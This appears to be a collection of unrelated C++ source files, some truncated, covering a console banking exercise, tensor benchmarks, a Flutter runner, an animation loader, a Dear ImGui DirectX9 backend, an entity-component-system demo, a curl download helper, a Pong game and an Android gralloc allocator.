    "#include <iostream>\r\n#include <fstream>\r\n#include <cstdlib>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nconst string RESET = \"\\033[0m\";\r\nconst string RED = \"\\033[1;31m\";\r\nconst string GREEN = \"\\033[1;32m\";\r\nconst string YELLOW = \"\\033[1;33m\";\r\nconst string ORANGE = \"\\033[1;38;5;214m\";\r\nconst string CYAN = \"\\033[1;36m\";\r\nconst string BOLD = \"\\033[1m\";\r\nconst int MAX_ACCOUNTS = 100;\r\n\r\nstruct Account\r\n{\r\n    string name;\r\n    string cnic;\r\n    int accno;\r\n    int balance;\r\n    int pin_code;\r\n};\r\n\r\nclass Bank\r\n{\r\n\tprivate:\r\n\t    Account *accountPtr;\r\n\t    int count;\r\n\t\r\n\tpublic:\r\n\t    Bank();\r\n\t    ~Bank();\r\n\t\r\n\t    bool isok(int no, int pin);\r\n\t    bool isValidCNIC(const string &cnic);\r\n\t    int findAccountIndex(int no);\r\n\t    void loadUserData();\r\n\t    void saveUserData();\r\n\t    bool isunique(int accno, int pinno);\r\n\t    void editAccount(int index);\r\n\t    void deleteAccount(int index);\r\n\t    void viewAccounts(int i);\r\n\t    void createAccount();\r\n\t    void accessAccount();\r\n};\r\n\r\nBank::Bank()\r\n{\r\n    accountPtr = new Account[MAX_ACCOUNTS];\r\n    count = 0;\r\n}\r\n\r\nBank::~Bank()\r\n{\r\n    delete[] accountPtr;\r\n}\r\n\r\nbool Bank::isok(int no, int pin)\r\n{\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (accountPtr[i].accno == no && accountPtr[i].pin_code == pin)\r\n        {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nbool Bank::isValidCNIC(const string &cnic)\r\n{\r\n    \r\n    if (cnic.length() != 15)\r\n        return false;\r\n\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        if (!isdigit(cnic[i]))\r\n            return false;\r\n    }\r\n\r\n    if (cnic[5] != '-')\r\n        return false;\r\n\r\n    for (int i = 6; i < 13; i++)\r\n    {\r\n        if (!isdigit(cnic[i]))\r\n            return false;\r\n    }\r\n\r\n    if (cnic[13] != '-')\r\n        return false;\r\n\r\n    if (!isdigit(cnic[14]))\r\n        return false;\r\n\r\n    return true;\r\n}\r\n\r\nint Bank::findAccountIndex(int no)\r\n{\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (accountPtr[i].accno == no)\r\n        {\r\n            return i;\r\n        }\r\n    }\r\n    return -1;\r\n}\r\n\r\nvoid Bank::loadUserData()\r\n{\r\n    ifstream infile(\"UserData.txt\");\r\n    if (!infile.is_open())\r\n    {\r\n        cout << \"Error opening file.\" << endl;\r\n        return;\r\n    }\r\n\r\n    while (infile >> accountPtr[count].name >> accountPtr[count].cnic >> accountPtr[count].accno >> accountPtr[count].balance >> accountPtr[count].pin_code)\r\n    {\r\n        count++;\r\n        if (count >= MAX_ACCOUNTS)\r\n        {\r\n            cout << \"Maximum number of accounts loaded.\" << endl;\r\n            break;\r\n        }\r\n    }\r\n\r\n    infile.close();\r\n}\r\n\r\nvoid Bank::saveUserData()\r\n{\r\n    ofstream outfile(\"UserData.txt\");\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        outfile << accountPtr[i].name << setw(20)\r\n                << accountPtr[i].cnic << setw(20)\r\n                << accountPtr[i].accno << setw(20)\r\n                << accountPtr[i].balance << setw(20)\r\n                << accountPtr[i].pin_code << endl;\r\n    }\r\n    outfile.close();\r\n}\r\n\r\nbool Bank::isunique(int accno, int pinno)\r\n{\r\n    for (int i = 0; i < count; i++)\r\n    {\r\n        if (accountPtr[i].accno == accno && accountPtr[i].pin_code == pinno)\r\n        {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nvoid Bank::editAccount(int index)\r\n{\r\n    cout << YELLOW << \"*****************************\\n\";\r\n    cout << \"\\t   EDITING ACCOUNT\\n\";\r\n    cout << \"*****************************\" << RESET << endl;\r\n    int edit_choice;\r\n    cout << CYAN << \"1. Edit Name\" << RESET << endl;\r\n    cout << CYAN << \"2. Edit CNIC\" << RESET << endl;\r\n    cout << CYAN << \"3. Change PIN\" << RESET << endl;\r\n    cout << \"Enter your choice: \";\r\n    cin >> edit_choice;\r\n\r\n    switch (edit_choice)\r\n    {\r\n    case 1:\r\n        cout << \"Enter your new name: \";\r\n        cin >> accountPtr[index].name;\r\n        cout << GREEN << \"Name updated successfully.\" << RESET << endl;\r\n        break;\r\n    case 2:\r\n        cout << \"Enter your new CNIC: \";\r\n        cin >> accountPtr[index].cnic;\r\n        cout << GREEN << \"CNIC updated successfully.\" << RESET << endl;\r\n        break;\r\n    case 3:\r\n        int old_pin;\r\n        cout << \"Enter your current PIN: \";\r\n        cin >> old_pin;\r\n        if (old_pin == accountPtr[index].pin_code)\r\n        {\r\n            int new_pin;\r\n            bool unique;\r\n\r\n            do\r\n            {\r\n                new_pin = rand() % 9000 + 1000;\r\n                unique = true;\r\n\r\n                for (int i = 0; i < count; i++)\r\n                {\r\n                    if (accountPtr[i].pin_code == new_pin)\r\n                    {\r\n                        unique = false;\r\n                        break;\r\n                    }\r\n                }\r\n            } while (!unique);\r\n\r\n            accountPtr[index].pin_code = new_pin;\r\n            cout << GREEN << \"Your new PIN is: \" << new_pin << RESET << endl;\r\n            cout << GREEN << \"PIN updated successfully.\" << RESET << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << R",
    "// (c) 2025 Mario \"Neo\" Sieg. <mario.sieg.64@gmail.com>\n\n// ON LINUX: Before running the benchmark, execute: prepare_system.sh to setup the system for performance measurements.\n\n#include <magnetron.h>\n#include <algorithm>\n#include <iostream>\n#include <thread>\n\nauto main() -> int {\n    auto threads = std::max(1u, std::thread::hardware_concurrency());\n    std::cout << \"Benchmarking Parallel MM on CPU with \" << threads << \" threads\" << std::endl;\n    mag_device_descriptor_t desc {};\n    desc.type = MAG_COMPUTE_DEVICE_TYPE_CPU;\n    desc.thread_count = threads;\n    mag_ctx_t* ctx = mag_ctx_create2(&desc);\n    mag_tensor_t* A = mag_tensor_create_3d(ctx, MAG_DTYPE_F32, 8192, 8192, 2);\n    mag_tensor_fill_random_normal(A, 0.0f, 1.0f);\n    mag_tensor_t* B = mag_tensor_create_3d(ctx, MAG_DTYPE_F32, 8192, 8192, 2);\n    mag_tensor_fill_random_normal(B, 0.0f, 1.0f);\n    for (volatile std::uint32_t i=0; i < 100; ++i) {\n        mag_tensor_t* R = mag_add(A, B);\n        mag_tensor_decref(R);\n    }\n    mag_tensor_decref(B);\n    mag_tensor_decref(A);\n    mag_ctx_destroy(ctx);\n    std::cout << \"Benchmark finished\" << std::endl;\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"smart_query_system\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// (c) 2025 Mario \"Neo\" Sieg. <mario.sieg.64@gmail.com>\n\n// ON LINUX: Before running the benchmark, execute: prepare_system.sh to setup the system for performance measurements.\n\n#include <magnetron.h>\n#define ANKERL_NANOBENCH_IMPLEMENT\n#include <nanobench.h>\n#include <thread>\n\n#include \"magnetron_internal.h\"\n\nstatic auto bench_cpu_compute(std::int64_t numel_per_dim) -> void {\n    ankerl::nanobench::Bench bench {};\n    bench.title(\"Parallel MM Big Tensor | Numel per Dim: \" + std::to_string(numel_per_dim))\n        .unit(\"MM\")\n        .warmup(100)\n        .relative(true)\n        .performanceCounters(true);\n\n    std::cout << \"Benchmarking Parallel MM on CPU with Numel per Dim: \" << numel_per_dim << std::endl;\n\n    auto exec_bench = [&](std::uint32_t threads) {\n        mag_device_descriptor_t desc {};\n        desc.type = MAG_COMPUTE_DEVICE_TYPE_CPU;\n        desc.thread_count = threads;\n        mag_ctx_t* ctx = mag_ctx_create2(&desc);\n        mag_tensor_t* A = mag_tensor_create_2d(ctx, MAG_DTYPE_F32, numel_per_dim, numel_per_dim);\n        mag_tensor_fill_random_normal(A, 0.0f, 1.0f);\n        mag_tensor_t* B = mag_tensor_create_2d(ctx, MAG_DTYPE_F32, numel_per_dim, numel_per_dim);\n        mag_tensor_fill_random_normal(B, 0.0f, 1.0f);\n        bench.run(\"Parallel MM on \" + std::to_string(threads) + \" threads, Elems = \" + std::to_string(A->numel), [&] {\n            mag_tensor_t* R = mag_matmul(A, B);\n            ankerl::nanobench::doNotOptimizeAway(R);\n            mag_tensor_decref(R);\n        });\n\n        ankerl::nanobench::doNotOptimizeAway(ctx);\n        mag_tensor_decref(B);\n        mag_tensor_decref(A);\n        mag_ctx_destroy(ctx);\n    };\n\n    std::uint32_t num_threads = std::max(1u, std::thread::hardware_concurrency());\n\n    for (std::uint32_t i=1; i <= num_threads;) {\n        exec_bench(i);\n        if (i == 1) ++i;\n        else i += 2;\n    }\n}\n\nauto main() -> int {\n    //bench_cpu_compute(10000);\n    bench_cpu_compute(1000);\n    bench_cpu_compute(750);\n    bench_cpu_compute(500);\n    bench_cpu_compute(250);\n    bench_cpu_compute(100);\n    bench_cpu_compute(10);\n    bench_cpu_compute(2);\n    //bench_cpu_compute(250);\n    return 0;\n}\n",
    "#include \"Animation.hpp\"\n#include <filesystem>\n#include <algorithm>\n#include <iostream>\n#include <numeric>\n\nAnimation::Animation()\n    : frameTime(1.0f/30.0f)  // Default 30 FPS\n    , currentTime(0.0f)\n    , currentFrame(0)\n    , playing(false)\n    , isLooping(true)\n    , totalMemoryUsage(0)\n    , maxLoadedFrames(DEFAULT_MAX_FRAMES)\n    , isInitialLoad(true)\n{\n    std::cout << \"Animation: Constructor called\" << std::endl;\n    currentSprite.setPosition(0, 0);\n}\n\nAnimation::~Animation() {\n    std::cout << \"Animation: Destructor called, cleaning up \" << loadedFrames.size() << \" frames\" << std::endl;\n    std::lock_guard<std::recursive_mutex> lock(frameMutex);\n    loadedFrames.clear();\n    framePaths.clear();\n    currentTexture.reset();\n    std::cout << \"Animation: All frames cleaned up\" << std::endl;\n}\n\nbool Animation::loadFromDirectory(const std::string& path, const std::string& extension) {\n    namespace fs = std::filesystem;\n    \n    try {\n        if (!fs::exists(path)) {\n            std::cerr << \"Animation::loadFromDirectory: Directory does not exist: \" << path << std::endl;\n            return false;\n        }\n\n        if (!fs::is_directory(path)) {\n            std::cerr << \"Animation::loadFromDirectory: Path is not a directory: \" << path << std::endl;\n            return false;\n        }\n        \n        // Clear existing frames and reset state\n        {\n            std::cout << \"Animation::loadFromDirectory: Clearing existing frames\" << std::endl;\n            stop();\n            loadedFrames.clear();\n            framePaths.clear();\n            currentTexture.reset();\n            totalMemoryUsage = 0;\n            isInitialLoad = true;  // Set initial load flag\n        }\n        \n        // Get all files with matching extension\n        std::vector<fs::path> files;\n        for (const auto& entry : fs::directory_iterator(path)) {\n            if (entry.path().extension() == extension) {\n                files.push_back(entry.path());\n            }\n        }\n        \n        if (files.empty()) {\n            std::cerr << \"Animation::loadFromDirectory: No files found with extension \" << extension << \" in \" << path << std::endl;\n            return false;\n        }\n        \n        // Sort files by name to ensure correct sequence\n        std::sort(files.begin(), files.end());\n        \n        // Store paths\n        {\n            framePaths = std::move(files);\n        }\n        \n        std::cout << \"Animation::loadFromDirectory: Found \" << framePaths.size() << \" frames\" << std::endl;\n        \n        // Load initial frame to get dimensions\n        auto firstTexture = ensureFrameLoaded(0);\n        if (!firstTexture) {\n            std::cerr << \"Animation::loadFromDirectory: Failed to load first frame\" << std::endl;\n            return false;\n        }\n        \n        auto size = firstTexture->getSize();\n        std::cout << \"Animation::loadFromDirectory: First frame size: \" << size.x << \"x\" << size.y << std::endl;\n        \n        // Initial loading phase complete\n        isInitialLoad = false;\n        \n        return true;\n    } catch (const std::exception& e) {\n        std::cerr << \"Animation::loadFromDirectory: Exception: \" << e.what() << std::endl;\n        return false;\n    }\n}\n\nstd::shared_ptr<sf::Texture> Animation::ensureFrameLoaded(size_t index) {\n    std::lock_guard<std::recursive_mutex> lock(frameMutex);\n    \n    if (index >= framePaths.size()) {\n        std::cerr << \"Animation::ensureFrameLoaded: Invalid frame index: \" << index << std::endl;\n        return nullptr;\n    }\n    \n    // First, check if we already have this frame\n    for (const auto& pair : loadedFrames) {\n        if (pair.first == index) {\n            return pair.second;\n        }\n    }\n    \n    try {\n        // Create new texture\n        auto texture = std::make_shared<sf::Texture>();\n        if (!texture) {\n            std::cerr << \"Animation::ensureFrameLoaded: Failed to allocate texture\" << std::endl;\n            return nullptr;\n        }\n        \n        texture->setSmooth(true);\n        \n        if (!texture->loadFromFile(framePaths[index].string())) {\n            std::cerr << \"Animation::ensureFrameLoaded: Failed to load texture: \" << framePaths[index] << std::endl;\n            return nullptr;\n        }\n        \n        // Calculate memory usage\n        auto size = texture->getSize();\n        size_t frameMemory = size.x * size.y * 4;\n        \n        // Add to loaded frames\n        loadedFrames.push_back({index, texture});\n        totalMemoryUsage += frameMemory;\n        \n        // If this is the first frame ever loaded, set up the sprite\n        if (loadedFrames.size() == 1 && !currentTexture) {\n            currentTexture = texture;\n            currentSprite.setTexture(*texture, true);\n            auto bounds = currentSprite.getLocalBounds();\n            currentSprite.setOrigin(bounds.width / 2.f, bounds.height / 2.f);\n        }\n        \n        // Only maintain frame window if we're not in initial loading\n        if (!isInitialLoad) {\n",
    "// dear imgui: Renderer Backend for DirectX9\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'LPDIRECT3DTEXTURE9' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n//  [X] Renderer: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\n//  2024-10-07: DirectX9: Changed default texture sampler to Clamp instead of Repeat/Wrap.\n//  2024-02-12: DirectX9: Using RGBA format when supported by the driver to avoid CPU side conversion. (#6575)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: DirectX9: Explicitly disable texture state stages after >= 1.\n//  2021-05-19: DirectX9: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-23: DirectX9: Explicitly setting up more graphics states to increase compatibility with unusual non-default states.\n//  2021-03-18: DirectX9: Calling IDirect3DStateBlock9::Capture() after CreateStateBlock() as a workaround for state restoring issues (see #3857).\n//  2021-03-03: DirectX9: Added support for IMGUI_USE_BGRA_PACKED_COLOR in user's imconfig file.\n//  2021-02-18: DirectX9: Change blending equation to preserve alpha in output buffer.\n//  2019-05-29: DirectX9: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX9: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2019-03-29: Misc: Fixed erroneous assert in ImGui_ImplDX9_InvalidateDeviceObjects().\n//  2019-01-16: Misc: Disabled fog before drawing UI's. Fixes issue #2288.\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-06-08: Misc: Extracted imgui_impl_dx9.cpp/.h away from the old combined DX9+Win32 example.\n//  2018-06-08: DirectX9: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-05-07: Render: Saving/restoring Transform because they don't seem to be included in the StateBlock. Setting shading mode to Gouraud.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX9_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_dx9.h\"\n\n// DirectX\n#include <d3d9.h>\n\n// DirectX data\nstruct ImGui_ImplDX9_Data\n{\n    LPDIRECT3DDEVICE9           pd3dDevice;\n    LPDIRECT3DVERTEXBUFFER9     pVB;\n    LPDIRECT3DINDEXBUFFER9      pIB;\n    LPDIRECT3DTEXTURE9          FontTexture;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX9_Data()        { memset((void*)this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct CUSTOMVERTEX\n{\n    float    pos[3];\n    D3DCOLOR col;\n    float    uv[2];\n};\n#define D3DFVF_CUSTOMVERTEX (D3DFVF_XYZ|D3DFVF_DIFFUSE|D3DFVF_TEX1)\n\n#ifdef IMGUI_USE_BGRA_PACKED_COLOR\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (_COL)\n#else\n#define IMGUI_COL_TO_DX9_ARGB(_COL)     (((_COL) & 0xFF00FF00) | (((_COL) & 0xFF0000) >> 16) | (((_COL) & 0xFF) << 16))\n#endif\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX9_Data* ImGui_ImplDX9_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX9_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Forward Declarations\nstatic void ImGui_ImplDX9_InitMultiViewportSupport();\nstatic void ImGui_ImplDX9_ShutdownMultiViewportSupport();\nstatic void ImGui_ImplDX9_Cre",
    "/**\n * @author      : mailitg (mailitg@$HOSTNAME)\n * @file        : main\n * @created     : Wednesday Jan 01, 2025 20:20:47 CET\n */\n\n#include <cstdint>\n#include <iostream>\n#include <ostream>\n#include <vector>\n\n#include \"ECS.hpp\"\n\nstruct Transform\n{\n    float x, y, z;\n};\n\nstruct Rigidbody\n{\n    float mass;\n};\n\nvoid mvt_system(std::vector<Entity> entities, void *args[])\n{\n    for (Entity const &entity : entities)\n    {\n        std::cout << \"mvt_system processing entity: \" << entity << std::endl;\n    }\n}\n\nvoid mvt2_system(std::vector<Entity> entities, void *args[])\n{\n    for (Entity const &entity : entities)\n    {\n        std::cout << \"mvt 2 system processing entity: \" << entity << std::endl;\n    }\n}\n\nint main(void)\n{\n    Scene menu = ECS::create_scene();\n    ECS::select_scene(menu);\n\n    ECS::register_component<Transform>(); \n    ECS::register_component<Rigidbody>(); \n\n    Entity player = ECS::create_entity();\n    Entity player2 = ECS::create_entity();\n    std::cout <<\"player mask: \"<< ECS::get_entity_mask(player)<< std::endl;\n\n    ECS::add_component<Transform>(player, { .x=10, .y=20, .z=30 });\n    ECS::add_component<Rigidbody>(player, { .mass = 50.0f }); \n\n    ECS::add_component<Rigidbody>(player2, { .mass = 50.0f }); \n    std::cout <<\"player mask: \"<< ECS::get_entity_mask(player)<< std::endl;\n\n    Transform *t = ECS::get_component<Transform>(player);\n    std::cout << \"tx:\"<< t->x << std::endl;\n\n    ComponentMask signature = ECS::create_signature<Transform, Rigidbody>();\n    ComponentMask signature2 = ECS::create_signature<Rigidbody>();\n    std::cout << \"Generated Signature: \" << signature << std::endl;\n\n    ECS::register_system(mvt_system, signature);\n    ECS::register_system(mvt2_system, signature2);\n\n    /* // Print the state before deletion */\n    /* std::cout << \"\\nBefore deleting entity:\" << std::endl; */\n    /* std::cout << \"Entity to Mask: \" << ECS::get_entity_mask(player) << std::endl; */\n    /* std::cout << \"Entity to Mask2: \" << ECS::get_entity_mask(player2) << std::endl; */\n\n    ECS::call_system(mvt_system);\n    ECS::call_system(mvt2_system);\n\n    ECS::remove_component<Transform>(player);\n    ECS::remove_component<Rigidbody>(player);\n\n    /* // Print the state after removing components */\n    /* std::cout << \"\\nAfter removing components:\" << std::endl; */\n    /* std::cout << \"Entity to Mask: \" << ECS::get_entity_mask(player) << std::endl; */\n\n    Rigidbody *r = ECS::get_component<Rigidbody>(player);\n\n    ECS::delete_entity(player); \n    ECS::delete_entity(player2);\n\n    ECS::add_component<Transform>(player, { .x=10, .y=20, .z=30 });\n    ECS::add_component<Rigidbody>(player2, { .mass = 50.0f }); \n\n    Transform *t2 = ECS::get_component<Transform>(player);\n    std::cout << \"t2x:\"<< t2->x << std::endl;\n\n    ECS::call_system(mvt_system);\n    ECS::call_system(mvt2_system);\n\n    Scene game = ECS::create_scene();\n    ECS::select_scene(game);\n\n    ECS::delete_scene(menu);\n\n    return 0;\n}\n\n",
    "//\n// Copyright (c) 2025, SpargatTeam\n// Wrote by Comical\n//\n#include \"download.h\"\n#include <iostream>\n#include <fstream>\n#include <curl/curl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <cstdlib>\n\nsize_t write_data(void* ptr, size_t size, size_t nmemb, void* stream) {\n    std::ofstream* outFile = static_cast<std::ofstream*>(stream);\n    outFile->write(static_cast<char*>(ptr), size * nmemb);\n    return size * nmemb;\n}\n\nstd::string get_download_path() {\n    const char* home_dir = std::getenv(\"HOME\");\n    if (home_dir) {\n        return std::string(home_dir) + \"/Downloads/\";\n    }\n    return \"./\"; \n}\n\nbool download_file(const std::string& url, const std::string& output_path) {\n    CURL* curl;\n    CURLcode res;\n    std::ofstream outFile;\n    outFile.open(output_path, std::ios::binary);\n    if (!outFile.is_open()) {\n        std::cerr << \"Eroare: Nu pot deschide fi\u0219ierul \" << output_path << \" pentru scriere.\\n\";\n        return false;\n    }\n    curl = curl_easy_init();\n    if (!curl) {\n        std::cerr << \"Eroare: Nu pot ini\u021bializa cURL.\\n\";\n        return false;\n    }\n    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outFile);\n    res = curl_easy_perform(curl);\n    if (res != CURLE_OK) {\n        std::cerr << \"Eroare la desc\u0103rcare: \" << curl_easy_strerror(res) << \"\\n\";\n        curl_easy_cleanup(curl);\n        outFile.close();\n        return false;\n    }\n    curl_easy_cleanup(curl);\n    outFile.close();\n    return true;\n}\n\nnamespace download {\n    bool file(const std::string& url) {\n        return download_file(url, get_download_path() + \"/Downloads/\");\n    }\n}",
    "#include <iostream>\n#include \"ball.h\"\n#include \"Paddle.h\"\n#include \"GameInfo.h\"\n#include <raylib.h>\n\n#define GAMEGREEN \\\n    CLITERAL(Color) { 124, 252, 0, 255 }\n\nvoid InitializeGame(GameInfo *gameInfo, Ball *ball);\nvoid BeginGame(GameInfo *gameInfo, Ball *ball, Paddle *player1, Paddle *player2);\n\nint main()\n{\n    GameInfo gameInfo;\n\n    const int screenWidth = 1280;\n    const int screenHeight = 800;\n\n    Ball ball(screenWidth / 2, screenHeight / 2);\n    Paddle player1(20, screenHeight / 2);\n    Paddle player2(screenWidth - 30, screenHeight / 2);\n    InitWindow(screenWidth, screenHeight, \"Pong Master\");\n    SetTargetFPS(FLAG_VSYNC_HINT);\n\n    while (!WindowShouldClose())\n    {\n        InitializeGame(&gameInfo, &ball);\n        BeginGame(&gameInfo, &ball, &player1, &player2);\n    }\n    CloseWindow();\n\n    return 0;\n}\n\nvoid InitializeGame(GameInfo *gameInfo, Ball *ball)\n{\n    gameInfo->StartGame();\n    gameInfo->SetScore(ball);\n    gameInfo->StopGame();\n}\n\nvoid BeginGame(GameInfo *gameInfo, Ball *ball, Paddle *player1, Paddle *player2)\n{\n\n    if (gameInfo->PlayGameState() == INSESSION)\n    {\n        player1->Controls(KEY_W, KEY_S);\n        player2->Controls(KEY_UP, KEY_DOWN);\n\n        ball->Update();\n        ball->IsCollidingWithPaddle(player1, -1);\n        ball->IsCollidingWithPaddle(player2, 1);\n\n        DrawCircle(GetScreenWidth() / 2, GetScreenHeight() / 2, 200, SKYBLUE);\n        DrawCircle(GetScreenWidth() / 2, GetScreenHeight() / 2, 150, BLUE);\n\n        DrawLineEx(Vector2{GetScreenWidth() / 2.0, GetScreenHeight() / 3.5}, Vector2{GetScreenWidth() / 2.0, 0}, 20, SKYBLUE);\n        DrawLineEx(Vector2{GetScreenWidth() / 2.0, GetScreenHeight()}, Vector2{GetScreenWidth() / 2.0, GetScreenHeight() - (GetScreenHeight() / 3.5)}, 20, SKYBLUE);\n    }\n\n    BeginDrawing();\n    ClearBackground(BLUE);\n\n    player1->Draw();\n    player2->Draw();\n    ball->Draw();\n\n    EndDrawing();\n}\n",
    "/*\n * Copyright (c) 2011-2019, The Linux Foundation. All rights reserved.\n\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *   * Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above\n *     copyright notice, this list of conditions and the following\n *     disclaimer in the documentation and/or other materials provided\n *     with the distribution.\n *   * Neither the name of The Linux Foundation nor the names of its\n *     contributors may be used to endorse or promote products derived\n *     from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <log/log.h>\n#include <algorithm>\n#include <vector>\n\n#include \"gr_utils.h\"\n#include \"gr_allocator.h\"\n#include \"gralloc_priv.h\"\n\n#include \"qd_utils.h\"\n\n#ifndef ION_FLAG_CP_PIXEL\n#define ION_FLAG_CP_PIXEL 0\n#endif\n\n#ifndef ION_FLAG_ALLOW_NON_CONTIG\n#define ION_FLAG_ALLOW_NON_CONTIG 0\n#endif\n\n#ifndef ION_FLAG_CP_CAMERA_PREVIEW\n#define ION_FLAG_CP_CAMERA_PREVIEW 0\n#endif\n\n#if TARGET_ION_ABI_VERSION >= 2\n#ifndef ION_SECURE\n#define ION_SECURE ION_FLAG_SECURE\n#endif\n#endif\n\n#ifdef MASTER_SIDE_CP\n#define CP_HEAP_ID ION_SECURE_HEAP_ID\n#define SD_HEAP_ID ION_SECURE_DISPLAY_HEAP_ID\n#define ION_CP_FLAGS (ION_SECURE | ION_FLAG_CP_PIXEL)\n#define ION_SD_FLAGS (ION_SECURE | ION_FLAG_CP_SEC_DISPLAY)\n#define ION_SC_FLAGS (ION_SECURE | ION_FLAG_CP_CAMERA)\n#define ION_SC_PREVIEW_FLAGS (ION_SECURE | ION_FLAG_CP_CAMERA_PREVIEW)\n#else  // SLAVE_SIDE_CP\n#define CP_HEAP_ID ION_CP_MM_HEAP_ID\n#ifdef USE_SECURE_HEAP\n#define SD_HEAP_ID ION_SECURE_DISPLAY_HEAP_ID\n#else\n#define SD_HEAP_ID ION_CP_MM_HEAP_ID\n#endif\n#define ION_CP_FLAGS (ION_SECURE | ION_FLAG_ALLOW_NON_CONTIG)\n#define ION_SD_FLAGS ION_SECURE\n#define ION_SC_FLAGS ION_SECURE\n#define ION_SC_PREVIEW_FLAGS ION_SECURE\n#endif\n\nusing std::vector;\nusing std::shared_ptr;\n\nnamespace gralloc1 {\n\nstatic BufferInfo GetBufferInfo(const BufferDescriptor &descriptor) {\n  return BufferInfo(descriptor.GetWidth(), descriptor.GetHeight(), descriptor.GetFormat(),\n                    